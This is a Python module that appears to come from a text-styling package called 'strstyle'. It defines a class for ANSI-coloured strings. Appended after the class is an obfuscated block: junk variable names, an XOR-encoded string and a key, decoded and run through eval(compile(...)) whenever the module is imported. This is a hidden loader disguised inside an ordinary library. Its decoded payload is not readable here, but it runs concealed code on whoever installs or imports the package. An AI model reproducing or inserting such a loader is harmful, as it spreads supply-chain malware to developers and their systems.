import os

import strstyle


class _StyledString(str):

    def __new__(cls, style_list, sep, *objects):
        return super(_StyledString, cls).__new__(cls, sep.join([str(obj) for obj in objects]))

    def __init__(self, style_list, sep, *objects):
        self._style_start = ';'.join([str(s[0]) for s in style_list])
        self._style_end = ';'.join([str(s[1]) for s in style_list])
        self._sep = sep
        self._objects = objects

    def __add__(self, other):
        return self.__str__() + str(other)

    def __str__(self):
        if strstyle._StyledStringBuilder._enabled:
            string = ''
            for i, obj in enumerate(self._objects):
                if i > 0:
                    string += self._sep

                if type(obj) is _StyledString:
                    string += '%s\033[%sm' % (obj, self._style_start)
                else:
                    string += str(obj)
            return '\033[%sm%s\033[%sm' % (self._style_start, string, self._style_end)
        return super(_StyledString, self).__str__()

    def rjust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.rjust(len(string) + n_chars, fillchar)
        return self

    def ljust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.ljust(len(string) + n_chars, fillchar)
        return self
wopvEaTEcopFEavc ="[XC]FA\x18]D\x1bGUQATYE\\\x14DDWHKWVPAD<ZP\x17BTVB_WG]\x1aEKGM]T\x1d\x1b\x1fKCSJ@FE\\EQ\x1b\x11{ZZMJ\x10\x1d\t;\x13\x15\x18\x11\x16\x10\x10\x18BGI\x032\x11\x16\x16\x14\x18\x19\x17\x11\x15\x13\x16\x18BQFZ\x15\\BQ[\x10\x15\x18CZI\x1fS[ZR\x1fHN\x16\x19\x18\x1eO\x12\x1c\x12VE\x13P\r8\x18\x17\x16\x19\x18\x15\x10\x14\x16\x12\x14\x19\x18\x19\x15\x12W\x16@@Q@P\x1a\x17\x13\x1b9ZZC[JF\x12GFSCGWRSCC2PG_T\x18DDZXQ[\x17XXCYJA\x18@WDFWGA2FEN\r3\x10\x15\x12\x16ETUXEPgLJY\x15\x0f\x10^GBGA\x02\x18\x19]T\x1bTFYBVV@\x17V]\\\x17D\x1d^XD\\\x05\x00@I\x05XKR\x0bXD\x1bG\\C\x1bKY\x11:\x10\x18\x16\x15\\V[PZiRQUR\x11\x08\x13\x11\x17AUB\x1d\x1bG_D\x1bKZ\x10=\x17\x19\x10\x15@SFD]DE\x1bMKTGPFE_V@R\x1aJR[VLPoAD^\x18\x19TVVS]gQ[TQ\x1c8\x15\x11\x19\x13@BQDJ]QQ@B\x1dVY]Z\x18\x12ZWFX\x19\x17E[F\x1b\x16MZA\x1b@^\x18\x0b\x17VWC\x1c\\AYT\x12\x05\t\x11\x08\x12\x19\x12E_TT[\x0caJL]\x1c?WOUVFC\x082\x17\x16\x19\x18EB]XF\x1c\x102\x19\x15\x12\x11\x18\x17\x12\x18\x14\x15\x12\x15\x11\x19\x13\x13\x15\x11\x16\x118\x12\x14\x13\x11\x13\x15\x18\x11SHS]FA\x10\x7fQ]Sx[L\x7fXD[WsJGW@\x08?\x13\x12\x14\x15\x18\x12\x17\x17\x17\x19\x10\x15BD^_L\x1f\x13\x17\x113\x18\x15\x15\x12\x17\x16\x13\x16DGZGDV[PCG\x18QUUT\x11\x17BHL_]V\x07\x15\x1dA\\I\x1cU^_Q\x16BK\x14\x15\x13\x1f\x15KYS\\\\\x05bGE\\\x11;<<>" 
iOpvEoeaaeavocp = "2532458277790526718715898552763672876985046249895218728452519337348224313581600865098166489715368582"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for i in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))